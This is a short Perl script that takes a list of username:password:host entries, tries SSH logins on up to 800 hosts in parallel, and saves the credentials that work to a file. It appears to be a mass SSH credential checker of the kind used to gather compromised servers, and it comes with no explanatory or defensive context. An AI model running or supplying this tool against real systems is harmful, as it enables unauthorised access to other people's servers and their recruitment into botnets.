#!/usr/bin/perl
use Net::SSH2; 
use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
my $pm = new Parallel::ForkManager(800); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
		$pm->start and next;
		$a = $i;
		$b = $i+1;
		$c = $i+2;
		$ssh = Net::SSH2->new();
		@cmd = "$newarray[$a]:$newarray[$b]:$newarray[$c]";
		$newcmd = chomp @cmd;
		if ($ssh->connect($newarray[$c])) {
				if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
						print "\e[32;1mAdding Server IP: ".$newarray[$c]."\n";
						goto add;
				} 
				else {
						print "\e[1;31;1mINVALID LOGIN: ".$newarray[$c]."\n";
				}
		} 
		else {
				print "\e[0;34mDEAD IP: ".$newarray[$c]."\n";
		}
		$pm->finish;
}
$pm->wait_all_children;
add:
	system("echo -e '@cmd' >> active.txt");
